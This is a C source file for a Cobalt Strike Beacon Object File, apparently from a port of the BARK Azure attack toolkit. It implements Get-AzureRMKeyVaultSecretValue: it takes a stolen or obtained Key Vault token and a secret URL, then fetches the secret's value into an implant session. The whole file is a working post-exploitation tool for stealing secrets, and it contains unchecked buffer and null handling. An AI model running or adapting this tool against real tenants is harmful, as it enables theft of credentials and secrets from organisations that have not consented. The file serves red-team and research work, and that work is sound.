/*
 * get_azurerm_key_vault_secret_value.c — BARK BOF
 * Get-AzureRMKeyVaultSecretValue — Get the value of a Key Vault secret
 *
 * Args : token (KV-scoped), secretId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   hostBuf[512], pathBuf[2048];
    char  *token = NULL, *secretId = NULL;
    LPWSTR wideHost = NULL, widePath = NULL;
    const char *start, *slash;

    BeaconDataParse(&parser, args, alen);
    token   = BeaconDataExtract(&parser, NULL);
    secretId = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_get_azurerm_key_vault_secret_value <token> <secretId>\n");
        return;
    }

    start = secretId;
    if (MSVCRT$strncmp(start, "https://", 8) == 0) start += 8;
    slash = MSVCRT$strstr(start, "/");
    if (!slash) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid URL: no path component\n");
        return;
    }
    {
        int hlen = (int)(slash - start);
        MSVCRT$strncpy(hostBuf, start, hlen);
        hostBuf[hlen] = '\0';
    }
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "%s?api-version=7.0", slash);

    wideHost = MbsToWcs(hostBuf);
    widePath = MbsToWcs(pathBuf);
    if (!wideHost || !widePath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] String conversion failed\n");
        HFree(wideHost); HFree(widePath);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Get-AzureRMKeyVaultSecretValue\n");
    BarkGet(wideHost, widePath, token);
    HFree(wideHost);
    HFree(widePath);
}
